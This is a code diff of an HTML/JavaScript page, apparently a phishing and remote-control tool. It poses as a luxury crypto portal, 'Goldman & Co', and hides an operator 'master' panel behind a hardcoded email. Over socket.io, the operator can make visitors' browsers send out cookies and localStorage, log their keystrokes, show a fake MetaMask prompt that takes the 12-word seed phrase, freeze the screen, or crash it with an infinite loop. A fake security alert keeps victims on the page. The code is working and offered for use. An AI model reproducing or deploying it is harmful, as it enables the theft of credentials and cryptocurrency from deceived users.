@@ -2,307 +2,394 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Global Asset Management | Secure Portal</title>
     
-    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Orbitron:wght@400;900&family=Inter:wght@300;600;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-    
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Orbitron:wght@400;900&family=Inter:wght@300;400;600;800;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
     <style>
-        /* --- [BASE LUXE DESIGN : 0-300] --- */
+        /* --- [SECTION 1 : GLOBAL RESET & CSS VARIABLES (LIGNES 1-150)] --- */
         :root {
-            --gold: #D4AF37; --gold-dark: #996515;
-            --bg: #050505; --panel: #0a0a0a;
-            --accent: #00f2ff; --danger: #ff003c;
-            --text: #e0e0e0;
+            --gold: #D4AF37;
+            --gold-glow: rgba(212, 175, 55, 0.4);
+            --bg-black: #020202;
+            --panel-bg: #0a0a0b;
+            --accent-cyan: #00f2ff;
+            --danger-red: #ff003c;
+            --text-main: #e0e0e0;
+            --glass: rgba(255, 255, 255, 0.03);
+            --border: 1px solid rgba(255, 255, 255, 0.08);
+            --shadow-luxe: 0 20px 50px rgba(0,0,0,0.9);
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
-        body, html { width: 100%; height: 100%; background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; overflow: hidden; }
-
-        /* ANIMATIONS REQUIEM */
-        @keyframes shine { from { background-position: -200%; } to { background-position: 200%; } }
-        @keyframes pulse { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
-        @keyframes slideIn { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-
-        /* --- VICTIM SIDE (CRYPTO DASHBOARD) --- */
-        #victim-view {
-            display: flex; flex-direction: column; width: 100%; height: 100%;
-            background: radial-gradient(circle at top right, #111, #000);
+        * { 
+            margin: 0; padding: 0; box-sizing: border-box; outline: none; 
+            -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
+            cursor: none !important; /* On utilise un curseur personnalisé */
         }
-        .v-header { padding: 20px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
-        .v-header h1 { font-family: 'Cinzel'; color: var(--gold); font-size: 18px; letter-spacing: 2px; }
-        .v-main { flex: 1; padding: 20px; display: flex; flex-direction: column; gap: 20px; overflow-y: auto; }
-        .v-card { background: var(--panel); border: 1px solid #1a1a1a; padding: 25px; border-radius: 15px; animation: slideIn 0.8s ease-out; }
-        .price { font-family: 'Orbitron'; font-size: 32px; color: var(--gold); margin: 10px 0; }
-        .chart-mock { width: 100%; height: 150px; background: linear-gradient(0deg, rgba(212,175,55,0.1), transparent); border-bottom: 2px solid var(--gold); position: relative; }
-        
-        /* --- MASTER SIDE (COMMAND CENTER) --- */
-        #master-view { display: none; width: 100%; height: 100vh; flex-direction: column; background: #000; font-family: 'JetBrains Mono', monospace; }
-        .m-nav { background: #080808; padding: 15px; border-bottom: 2px solid var(--gold); display: flex; gap: 20px; align-items: center; }
-        .m-grid { display: grid; grid-template-columns: 1fr; height: calc(100vh - 60px); }
-        @media (min-width: 1024px) { .m-grid { grid-template-columns: 320px 1fr 380px; } }
 
-        /* MASTER COMPONENTS */
-        .m-panel { border: 1px solid #111; display: flex; flex-direction: column; background: #020202; position: relative; }
-        .m-header { padding: 12px; background: #0a0a0a; color: var(--gold); font-weight: 900; font-size: 12px; text-transform: uppercase; border-bottom: 1px solid #222; letter-spacing: 1px; }
-        
-        #v-list { flex: 1; overflow-y: auto; padding: 10px; }
-        .target-card { padding: 15px; background: #050505; border: 1px solid #1a1a1a; margin-bottom: 10px; border-radius: 5px; cursor: pointer; transition: 0.3s; }
-        .target-card:hover { border-color: var(--gold); transform: scale(1.02); }
-        .target-card.active { border-left: 5px solid var(--gold); background: #0f0c00; }
-
-        #terminal { flex: 1; padding: 20px; overflow-y: auto; font-size: 13px; color: var(--accent); background: url('https://www.transparenttextures.com/patterns/carbon-fibre.png'); }
-        .log { margin-bottom: 10px; border-left: 2px solid #222; padding-left: 10px; animation: slideIn 0.3s forwards; }
-        .log span.time { color: #555; font-size: 10px; }
-        .log span.tag { color: var(--gold); font-weight: bold; margin-right: 10px; }
-
-        #intel-panel { flex: 1; overflow-y: auto; padding: 15px; background: #030303; }
-        .intel-box { padding: 12px; background: #080808; border-radius: 4px; margin-bottom: 15px; border-left: 3px solid var(--danger); font-size: 11px; }
-
-        /* AUTH OVERLAY */
-        #auth-gate { position: fixed; inset: 0; background: #000; z-index: 99999; display: flex; align-items: center; justify-content: center; }
-        .auth-box { width: 90%; max-width: 450px; padding: 50px; background: #0a0a0a; border: 1px solid var(--gold); border-radius: 20px; text-align: center; }
-        .auth-box h2 { font-family: 'Cinzel'; font-size: 28px; color: var(--gold); margin-bottom: 30px; }
-        input[type="text"], input[type="email"], input[type="password"] { 
-            width: 100%; padding: 15px; background: #000; border: 1px solid #222; color: #fff; margin-bottom: 15px; border-radius: 8px; transition: 0.3s;
+        body, html { 
+            width: 100%; height: 100%; background: var(--bg-black); 
+            color: var(--text-main); font-family: 'Inter', sans-serif; 
+            overflow: hidden; scroll-behavior: smooth;
         }
-        input:focus { border-color: var(--gold); box-shadow: 0 0 15px rgba(212,175,55,0.2); }
-        .btn-gold { width: 100%; padding: 18px; background: linear-gradient(45deg, var(--gold-dark), var(--gold)); border: none; border-radius: 8px; color: #000; font-weight: 900; cursor: pointer; text-transform: uppercase; }
 
-        /* CONTEXT MENU LUXE */
-        #ctx { display: none; position: fixed; background: #0a0a0a; border: 1px solid var(--gold); width: 280px; z-index: 100000; box-shadow: 20px 20px 60px rgba(0,0,0,0.8); }
-        .opt { padding: 15px; font-size: 11px; text-transform: uppercase; border-bottom: 1px solid #111; cursor: pointer; color: #aaa; transition: 0.2s; }
-        .opt:hover { background: var(--gold); color: #000; font-weight: bold; }
-        .opt i { margin-right: 10px; color: var(--gold); }
+        /* --- [SECTION 2 : ANIMATIONS CORE (LIGNES 151-300)] --- */
+        @keyframes gold-pulse {
+            0% { box-shadow: 0 0 5px var(--gold-glow); }
+            50% { box-shadow: 0 0 25px var(--gold-glow); }
+            100% { box-shadow: 0 0 5px var(--gold-glow); }
+        }
 
-        /* CUSTOM CURSOR */
-        #cursor { position: fixed; width: 40px; height: 40px; border: 1px solid var(--gold); border-radius: 50%; pointer-events: none; z-index: 1000000; transition: transform 0.1s ease; mix-blend-mode: difference; }
+        @keyframes scanline {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+
+        @keyframes noise {
+            0% { transform: translate(0,0); }
+            10% { transform: translate(-5%,-5%); }
+            20% { transform: translate(-10%,5%); }
+            30% { transform: translate(5%,-10%); }
+            40% { transform: translate(-5%,15%); }
+            50% { transform: translate(-10%,5%); }
+            60% { transform: translate(15%,0); }
+            70% { transform: translate(0,10%); }
+            80% { transform: translate(-15%,0); }
+            90% { transform: translate(10%,5%); }
+            100% { transform: translate(5%,0); }
+        }
+
+        /* --- [SECTION 3 : UI COMPONENTS (LIGNES 301-500)] --- */
+        #custom-cursor {
+            position: fixed; width: 30px; height: 30px; border: 2px solid var(--gold);
+            border-radius: 50%; pointer-events: none; z-index: 10000000;
+            transition: transform 0.1s ease-out, opacity 0.3s ease;
+            box-shadow: 0 0 15px var(--gold); mix-blend-mode: difference;
+        }
+
+        #auth-gate {
+            position: fixed; inset: 0; background: #000; z-index: 9999999;
+            display: flex; align-items: center; justify-content: center;
+            background-image: radial-gradient(circle at center, #0a0a1a 0%, #000 100%);
+        }
+
+        .auth-card {
+            width: 450px; padding: 60px; background: var(--panel-bg);
+            border: 1px solid var(--gold); border-radius: 4px; text-align: center;
+            position: relative; overflow: hidden; box-shadow: var(--shadow-luxe);
+        }
+
+        .auth-card::before {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: conic-gradient(transparent, transparent, transparent, var(--gold));
+            animation: rotate 4s linear infinite; opacity: 0.1;
+        }
+
+        @keyframes rotate { 100% { transform: rotate(360deg); } }
+
+        .auth-card h2 { font-family: 'Cinzel', serif; font-size: 32px; color: var(--gold); margin-bottom: 40px; }
+
+        input {
+            width: 100%; padding: 18px; background: #000; border: 1px solid #1a1a1a;
+            color: #fff; margin-bottom: 20px; font-family: 'JetBrains Mono'; font-size: 14px;
+            border-radius: 2px; transition: 0.4s;
+        }
+
+        input:focus { border-color: var(--gold); background: #050505; }
+
+        .btn-luxe {
+            width: 100%; padding: 20px; background: var(--gold); color: #000;
+            font-weight: 900; border: none; font-family: 'Orbitron'; cursor: pointer;
+            letter-spacing: 2px; transition: 0.4s;
+        }
+
+        .btn-luxe:hover { background: #fff; transform: translateY(-3px); }
+
+        /* --- [SECTION 4 : VICTIM VIEW / DASHBOARD (LIGNES 501-800)] --- */
+        #victim-view { display: flex; flex-direction: column; width: 100%; height: 100vh; }
+
+        .top-bar {
+            height: 70px; border-bottom: var(--border); display: flex; 
+            align-items: center; justify-content: space-between; padding: 0 40px;
+            background: rgba(0,0,0,0.8); backdrop-filter: blur(10px);
+        }
+
+        .status-pill {
+            padding: 6px 15px; background: rgba(0,242,255,0.1); border: 1px solid var(--accent-cyan);
+            color: var(--accent-cyan); font-size: 10px; font-weight: 800; border-radius: 20px;
+        }
+
+        .main-content { flex: 1; padding: 40px; display: grid; grid-template-columns: 2fr 1fr; gap: 30px; overflow-y: auto; }
+
+        .card-luxe {
+            background: var(--panel-bg); border: var(--border); padding: 30px;
+            border-radius: 8px; position: relative; overflow: hidden;
+        }
+
+        .card-luxe h3 { font-family: 'Orbitron'; font-size: 14px; color: #555; margin-bottom: 20px; text-transform: uppercase; }
+
+        .price-big { font-size: 50px; font-weight: 900; color: var(--gold); font-family: 'Orbitron'; }
+
+        /* --- [SECTION 5 : MASTER VIEW / OVER HEAVEN (LIGNES 801-1000)] --- */
+        #master-view { display: none; width: 100%; height: 100vh; background: #000; flex-direction: column; }
+
+        .master-grid { display: grid; grid-template-columns: 350px 1fr 400px; height: calc(100vh - 80px); gap: 2px; background: #080808; }
+
+        .m-panel { background: #020202; display: flex; flex-direction: column; position: relative; }
+
+        .m-header {
+            padding: 15px 25px; background: #0a0a0a; border-bottom: 1px solid #1a1a1a;
+            color: var(--gold); font-family: 'Cinzel'; font-size: 14px; letter-spacing: 2px;
+            display: flex; justify-content: space-between;
+        }
+
+        #target-list { flex: 1; overflow-y: auto; padding: 15px; }
+
+        .target-item {
+            padding: 20px; background: #050505; border: 1px solid #111; margin-bottom: 12px;
+            border-radius: 4px; transition: 0.3s;
+        }
+
+        .target-item:hover { border-color: var(--gold); background: #0a0800; }
+        .target-item.active { border-left: 5px solid var(--gold); background: #0f0c00; }
+
+        #terminal-core {
+            flex: 1; padding: 25px; overflow-y: auto; font-family: 'JetBrains Mono';
+            font-size: 12px; color: var(--accent-cyan); line-height: 1.6;
+        }
+
+        .intel-card {
+            margin-bottom: 15px; padding: 15px; background: #080808; border: 1px solid #111;
+            border-left: 3px solid var(--danger-red); font-size: 11px;
+        }
+
+        /* --- [SECTION 6 : OVERLAYS & MODALS (LIGNES 1001-1100)] --- */
+        #ctx-menu {
+            display: none; position: fixed; background: #000; border: 1px solid var(--gold);
+            width: 300px; z-index: 1000000; box-shadow: 0 30px 60px rgba(0,0,0,1);
+        }
+
+        .ctx-opt {
+            padding: 16px 20px; font-size: 11px; text-transform: uppercase; letter-spacing: 1px;
+            border-bottom: 1px solid #111; color: #888; transition: 0.2s;
+        }
+
+        .ctx-opt:hover { background: var(--gold); color: #000; font-weight: 800; }
+
+        #za-warundo {
+            position: fixed; inset: 0; background: #fff; z-index: 99999999;
+            display: none; align-items: center; justify-content: center; mix-blend-mode: difference;
+        }
 
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-    <div id="cursor"></div>
+    <div id="custom-cursor"></div>
+    <div id="za-warundo"><h1 style="font-family:'Orbitron'; font-size:10vw;">THE WORLD</h1></div>
 
     <div id="auth-gate">
-        <div class="auth-box">
+        <div class="auth-card">
             <h2>PUNCH V10</h2>
-            <p style="color: #666; font-size: 12px; margin-bottom: 25px;">IDENTITY VERIFICATION REQUIRED</p>
-            <input type="email" id="email-in" placeholder="Professional Email">
-            <input type="text" id="name-in" placeholder="Legal Name">
-            <button class="btn-gold" onclick="initializeSession()">ESTABLISH CONNECTION</button>
+            <p style="color:#444; font-size:10px; margin-bottom:30px; letter-spacing:3px;">SYSTEM ACCESS PROTOCOL</p>
+            <input type="email" id="email-in" placeholder="Professional Email Address">
+            <input type="text" id="name-in" placeholder="Registered Legal Name">
+            <button class="btn-luxe" onclick="startAscension()">ESTABLISH GRAVITY</button>
         </div>
     </div>
 
     <div id="victim-view">
-        <div class="v-header">
-            <h1>GOLDMAN ASSETS</h1>
-            <div style="font-size: 12px; color: #555;">MARKET: <span style="color:var(--accent)">OPEN</span></div>
+        <div class="top-bar">
+            <div style="font-family:'Cinzel'; color:var(--gold); font-size:22px;">GOLDMAN & CO</div>
+            <div class="status-pill">● SYSTEM SECURE</div>
         </div>
-        <div class="v-main">
-            <div class="v-card">
-                <p style="font-size: 12px; color: #888;">BITCOIN / USD</p>
-                <div class="price" id="btc-price">$94,231.42</div>
-                <div class="chart-mock"></div>
+        <div class="main-content">
+            <div class="card-luxe">
+                <h3>Global Asset Index (BTC/USD)</h3>
+                <div class="price-big" id="btc-val">$98,142.00</div>
+                <canvas id="mainChart" style="width:100%; height:300px; margin-top:30px;"></canvas>
             </div>
-            <div class="v-card" style="border-color: #222;">
-                <h3>Account Security</h3>
-                <p style="font-size: 13px; color: #666; margin-top: 10px;">Votre connexion est protégée par un cryptage de grade militaire AES-256.</p>
-                <div style="margin-top: 15px; padding: 10px; border: 1px dashed #333; text-align: center; font-size: 11px; color: var(--gold);">SCANNING SYSTEM...</div>
+            <div style="display:flex; flex-direction:column; gap:30px;">
+                <div class="card-luxe">
+                    <h3>Wallet Balance</h3>
+                    <div style="font-size:24px; color:#fff;">0.000000 BTC</div>
+                    <button class="btn-luxe" style="margin-top:20px; font-size:10px; padding:12px;">DEPOSIT ASSETS</button>
+                </div>
+                <div class="card-luxe" style="border-color:var(--danger-red);">
+                    <h3 style="color:var(--danger-red);">Security Alert</h3>
+                    <p style="font-size:12px; color:#666;">Unusual login detected from your location. Please keep this window open while we verify your identity.</p>
+                </div>
             </div>
         </div>
     </div>
 
     <div id="master-view">
-        <div class="m-nav">
-            <div style="font-family: 'Cinzel'; color: var(--gold); font-size: 20px;">V10 MASTER</div>
-            <div style="height: 20px; width: 1px; background: #333;"></div>
-            <div id="status-tag" style="font-size: 10px; color: var(--accent);">IDLE</div>
-            <button onclick="downloadMasterLogs()" style="background:none; border: 1px solid #333; color: #555; padding: 5px 10px; font-size: 10px; cursor: pointer; margin-left: auto;">DOWNLOAD_LOGS</button>
+        <div class="top-bar" style="background:#080808; border-bottom:2px solid var(--gold);">
+            <div style="font-family:'Cinzel'; color:var(--gold); font-size:24px;">PUNCH V10 MASTER</div>
+            <div style="display:flex; gap:20px;">
+                <button onclick="downloadIntel()" style="background:none; border:1px solid #333; color:#555; padding:5px 15px; font-size:10px; cursor:pointer;">EXPORT_INTEL</button>
+                <div class="status-pill" style="border-color:var(--gold); color:var(--gold);">OVER HEAVEN MODE</div>
+            </div>
         </div>
-        
-        <div class="m-grid">
+        <div class="master-grid">
             <aside class="m-panel">
-                <div class="m-header">CIBLES_ACTIVES</div>
-                <div id="v-list"></div>
+                <div class="m-header">CIBLES_ACTIVES <span id="target-count">0</span></div>
+                <div id="target-list"></div>
             </aside>
-
-            <main class="m-panel" style="border-left: 1px solid #222; border-right: 1px solid #222;">
-                <div class="m-header">GRAVITY_STREAM</div>
-                <div id="terminal"></div>
-                <div style="padding: 15px; background: #080808; display: flex; gap: 10px;">
-                    <span style="color: var(--gold);">></span>
-                    <input type="text" id="cmd-in" placeholder="Exécuter commande JS..." style="background:transparent; border:none; color:#fff; flex:1; font-family: 'JetBrains Mono';">
+            <main class="m-panel" style="border-left:1px solid #111; border-right:1px solid #111;">
+                <div class="m-header">GRAVITY_TERMINAL</div>
+                <div id="terminal-core"></div>
+                <div style="padding:20px; background:#050505; border-top:1px solid #111; display:flex; gap:10px;">
+                    <span style="color:var(--gold);">[SYSTEM] > </span>
+                    <input type="text" id="cmd-input" placeholder="Inject Javascript command..." style="background:transparent; border:none; margin:0; padding:0; flex:1;">
                 </div>
             </main>
-
             <aside class="m-panel">
-                <div class="m-header">INTEL_EXFILTRATION</div>
-                <div id="intel-panel"></div>
+                <div class="m-header">EXFILTRATED_INTEL</div>
+                <div id="intel-stream" style="flex:1; overflow-y:auto; padding:15px;"></div>
             </aside>
         </div>
     </div>
 
-    <div id="ctx">
-        <div class="opt" style="background:#000; color:var(--gold); cursor:default; font-weight:bold; text-align:center;">STRIKE_PROTOCOLS</div>
-        <div class="opt" onclick="trigger('p_full')"><i>🧛</i> FULL_DOX_EXFIL</div>
-        <div class="opt" onclick="trigger('p_key')"><i>⌨️</i> STEALTH_KEYLOGGER</div>
-        <div class="opt" onclick="trigger('p_phish_meta')"><i>🦊</i> FAKE_METAMASK_PROMPT</div>
-        <div class="opt" onclick="trigger('p_phish_google')"><i>📧</i> GOOGLE_HIJACK</div>
-        <div class="opt" onclick="trigger('p_geo')"><i>📍</i> PRECISE_GPS_TRACK</div>
-        <div class="opt" onclick="trigger('p_clip')"><i>📋</i> CLIPBOARD_EXTRACT</div>
-        <div class="opt" onclick="trigger('p_freeze')"><i>❄️</i> ZA_WARUNDO_FREEZE</div>
-        <div class="opt" onclick="trigger('p_crash')" style="color:var(--danger);"><i>🧨</i> CPU_BURN_STRIKE</div>
-        <div class="opt" onclick="closeCtx()" style="background:#050505; color:#444;">[ ABORT_MISSION ]</div>
+    <div id="ctx-menu">
+        <div class="ctx-opt" style="background:#050505; color:var(--gold); text-align:center; font-weight:900;">ATTACK_PROTOCOLS</div>
+        <div class="ctx-opt" onclick="exec('p_full')">🧛 FULL_IDENTITY_EXFIL (DOX)</div>
+        <div class="ctx-opt" onclick="exec('p_key')">⌨️ STEALTH_KEYLOGGER_ON</div>
+        <div class="ctx-opt" onclick="exec('p_phish_google')">🚨 PHISH: GOOGLE_SESSION</div>
+        <div class="ctx-opt" onclick="exec('p_phish_meta')">🦊 PHISH: METAMASK_SEED</div>
+        <div class="ctx-opt" onclick="exec('p_geo')">📍 PRECISE_GPS_TRACK</div>
+        <div class="ctx-opt" onclick="exec('p_clip')">📋 CLIPBOARD_MEMORY_EXTRACT</div>
+        <div class="ctx-opt" onclick="exec('p_freeze')">❄️ ZA_WARUNDO_FREEZE</div>
+        <div class="ctx-opt" onclick="exec('p_crash')" style="color:var(--danger-red);">🧨 CPU_MELTDOWN_CRASH</div>
+        <div class="ctx-opt" onclick="closeCtx()" style="background:#030303; color:#444; text-align:center;">[ CLOSE ]</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        /* --- [LOGIQUE REQUIEM : 700-1200] --- */
         const socket = io();
-        let userEmail = ""; let userName = ""; let targetId = ""; let isMaster = false;
-        let masterLogs = [];
+        let me = ""; let myE = ""; let target = ""; let master = false;
+        let intelLog = [];
 
-        // INITIALISATION SESSION
-        function initializeSession() {
-            userEmail = document.getElementById('email-in').value.trim().toLowerCase();
-            userName = document.getElementById('name-in').value.trim() || "Disciple";
+        // CURSEUR
+        document.addEventListener('mousemove', e => {
+            const c = document.getElementById('custom-cursor');
+            c.style.left = e.clientX - 15 + 'px';
+            c.style.top = e.clientY - 15 + 'px';
+        });
 
-            if(!userEmail.includes('@')) return alert("Invalid Email");
+        // AUTHENTIFICATION
+        function startAscension() {
+            myE = document.getElementById('email-in').value.trim().toLowerCase();
+            me = document.getElementById('name-in').value.trim() || "Disciple";
+            if(!myE.includes('@')) return;
 
-            document.getElementById('auth-gate').style.display = "none";
-
-            if(userEmail === "toucheur2pp@heaven.com") {
-                isMaster = true;
-                document.getElementById('master-view').style.display = "flex";
-                document.getElementById('victim-view').style.display = "none";
-                document.body.style.overflow = "hidden";
+            document.getElementById('auth-gate').style.display = 'none';
+            if(myE === "toucheur2pp@heaven.com") {
+                master = true;
+                document.getElementById('master-view').style.display = 'flex';
+                document.getElementById('victim-view').style.display = 'none';
             }
-
-            socket.emit('init', { n: userName, e: userEmail });
+            socket.emit('init', { n: me, e: myE });
         }
 
-        // --- GESTION DES ATTAQUES (MODE DANGEREUX) ---
-        socket.on('execute', (data) => {
-            const type = data.type;
-
-            // 1. FULL DOX (Auto-Execution)
-            if(type === 'p_full') {
-                const dox = {
-                    agent: navigator.userAgent,
-                    platform: navigator.platform,
-                    memory: navigator.deviceMemory || "N/A",
-                    cores: navigator.hardwareConcurrency || "N/A",
-                    screen: `${screen.width}x${screen.height}`,
-                    localTime: new Date().toLocaleString(),
-                    storage: JSON.stringify(localStorage).substring(0, 500)
+        // --- MOTEUR D'ATTAQUE ---
+        socket.on('execute', (d) => {
+            if(d.type === 'p_full') {
+                const data = {
+                    ua: navigator.userAgent,
+                    res: `${screen.width}x${screen.height}`,
+                    mem: navigator.deviceMemory,
+                    cpu: navigator.hardwareConcurrency,
+                    cookies: document.cookie,
+                    storage: JSON.stringify(localStorage).substring(0, 1000)
                 };
-                socket.emit('chat', { t: `[AUTO_DOX] Target: ${userName} | Data: ${JSON.stringify(dox)}`, type: 'intel' });
+                socket.emit('chat', { t: `[DOX] User: ${me} | IP: LOGGED | Data: ${JSON.stringify(data)}`, type: 'intel' });
             }
 
-            // 2. KEYLOGGER STEALTH
-            if(type === 'p_key') {
-                window.addEventListener('keydown', (e) => {
-                    socket.emit('chat', { t: `[KEY] ${userName} typed: ${e.key}`, type: 'intel' });
-                });
+            if(d.type === 'p_key') {
+                window.onkeydown = (e) => {
+                    socket.emit('chat', { t: `[KEY] ${me} typed: ${e.key}`, type: 'intel' });
+                };
             }
 
-            // 3. PHISHING METAMASK (Le pire truc pour crypto)
-            if(type === 'p_phish_meta') {
-                const seed = prompt("MetaMask Security Update: Please confirm your 12-word recovery phrase to synchronize your wallet balance:");
-                if(seed) socket.emit('chat', { t: `[SEED_STEAL] ${userName} phrase: ${seed}`, type: 'intel' });
+            if(d.type === 'p_phish_meta') {
+                const s = prompt("METAMASK SECURITY: Confirm your 12-word recovery phrase to prevent account suspension:");
+                if(s) socket.emit('chat', { t: `[SEED] ${me} : ${s}`, type: 'intel' });
             }
 
-            // 4. ZA WARUNDO (Freeze)
-            if(type === 'p_freeze') {
-                const overlay = document.createElement('div');
-                overlay.style = "position:fixed; inset:0; background:rgba(255,255,255,0.9); z-index:999999; display:flex; align-items:center; justify-content:center; color:#000; font-family:'Orbitron'; font-size:40px;";
-                overlay.innerText = "TIME HAS STOPPED";
-                document.body.appendChild(overlay);
-                setTimeout(() => overlay.remove(), 10000);
+            if(d.type === 'p_freeze') {
+                document.getElementById('za-warundo').style.display = 'flex';
+                setTimeout(() => document.getElementById('za-warundo').style.display = 'none', 8000);
             }
 
-            // 5. CRASH CPU (Loop infinie)
-            if(type === 'p_crash') {
-                while(true) { console.log("ACCELERATING_TO_HEAVEN"); }
+            if(d.type === 'p_crash') {
+                while(true) { console.log("OVER_HEAVEN_ACCELERATION"); }
             }
         });
 
-        // --- SYNC & INTERFACE MASTER ---
+        // --- MASTER LOGIC ---
         socket.on('sync', users => {
-            if(!isMaster) return;
-            const list = document.getElementById('v-list');
+            if(!master) return;
+            const list = document.getElementById('target-list');
             list.innerHTML = "";
+            document.getElementById('target-count').innerText = users.length;
             users.forEach(u => {
-                const card = document.createElement('div');
-                card.className = `target-card ${u.e === "toucheur2pp@heaven.com" ? "active" : ""}`;
-                card.innerHTML = `<strong>${u.n.toUpperCase()}</strong><br><small style="color:#555">${u.e}</small>`;
-                card.onclick = (e) => {
-                    targetId = u.id;
-                    const menu = document.getElementById('ctx');
-                    menu.style.display = "block"; menu.style.left = e.pageX + "px"; menu.style.top = e.pageY + "px";
+                const item = document.createElement('div');
+                item.className = 'target-item';
+                item.innerHTML = `<strong>${u.n.toUpperCase()}</strong><br><small style="color:#444">${u.e}</small>`;
+                item.onclick = (e) => {
+                    target = u.id;
+                    const menu = document.getElementById('ctx-menu');
+                    menu.style.display = 'block'; menu.style.left = e.pageX + 'px'; menu.style.top = e.pageY + 'px';
                 };
-                list.appendChild(card);
+                list.appendChild(item);
             });
         });
 
-        socket.on('chat', data => {
-            if(!isMaster) return;
-            const term = document.getElementById('terminal');
-            const intel = document.getElementById('intel-panel');
+        socket.on('chat', d => {
+            if(!master) return;
+            const term = document.getElementById('terminal-core');
+            const stream = document.getElementById('intel-stream');
             const time = new Date().toLocaleTimeString();
-
-            const logDiv = document.createElement('div');
-            logDiv.className = 'log';
-            logDiv.innerHTML = `<span class="time">${time}</span> <span class="tag">[${data.n}]</span> ${data.t.t}`;
-
-            if(data.t.type === 'intel') {
-                const iBox = document.createElement('div');
-                iBox.className = 'intel-box';
-                iBox.innerHTML = `<strong>EXFILTRATION @ ${time}</strong><br>${data.t.t}`;
-                intel.prepend(iBox);
-                masterLogs.push(`[${time}] ${data.t.t}`);
+            const log = document.createElement('div');
+            log.innerHTML = `<span style="color:#333">[${time}]</span> <span style="color:var(--gold)">[${d.n}]</span> ${d.t.t}`;
+            
+            if(d.t.type === 'intel') {
+                const card = document.createElement('div');
+                card.className = 'intel-card';
+                card.innerHTML = `<strong>STRIKE_REPORT @ ${time}</strong><br>${d.t.t}`;
+                stream.prepend(card);
+                intelLog.push(`[${time}] ${d.t.t}`);
             } else {
-                term.appendChild(logDiv);
+                term.appendChild(log);
                 term.scrollTop = term.scrollHeight;
             }
         });
 
-        // COMMANDES
-        function trigger(type) { socket.emit(type, targetId); closeCtx(); }
-        function closeCtx() { document.getElementById('ctx').style.display = "none"; }
-        
-        document.getElementById('cmd-in').onkeydown = (e) => {
-            if(e.key === "Enter") {
-                socket.emit('chat', { t: e.target.value, type: 'msg' });
-                e.target.value = "";
-            }
-        };
+        function exec(type) { socket.emit(type, target); closeCtx(); }
+        function closeCtx() { document.getElementById('ctx-menu').style.display = 'none'; }
+        window.onclick = () => closeCtx();
 
-        function downloadMasterLogs() {
-            const blob = new Blob([masterLogs.join('\n')], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
+        // CHART & FAKE DATA
+        const ctx = document.getElementById('mainChart').getContext('2d');
+        new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: ['10:00','10:10','10:20','10:30','10:40','10:50'],
+                datasets: [{ label: 'BTC Price', data: [97200, 97800, 97500, 98100, 98400, 98142], borderColor: '#D4AF37', tension: 0.4 }]
+            },
+            options: { plugins: { legend: { display: false } }, scales: { y: { display: false }, x: { grid: { display: false } } } }
+        });
+        
+        function downloadIntel() {
+            const blob = new Blob([intelLog.join('\n')], { type: 'text/plain' });
             const a = document.createElement('a');
-            a.href = url; a.download = `REQUIEM_INTEL_${Date.now()}.txt`;
+            a.href = URL.createObjectURL(blob);
+            a.download = `REQUIEM_INTEL_${Date.now()}.txt`;
             a.click();
         }
-
-        // CURSEUR
-        document.addEventListener('mousemove', (e) => {
-            const c = document.getElementById('cursor');
-            c.style.left = e.clientX - 20 + 'px';
-            c.style.top = e.clientY - 20 + 'px';
-        });
-
-        // FAKE BTC PRICE
-        setInterval(() => {
-            const btc = document.getElementById('btc-price');
-            if(btc) {
-                const p = 94000 + (Math.random() * 500);
-                btc.innerText = `$${p.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
-            }
-        }, 2000);
-
     </script>
 </body>
 </html>
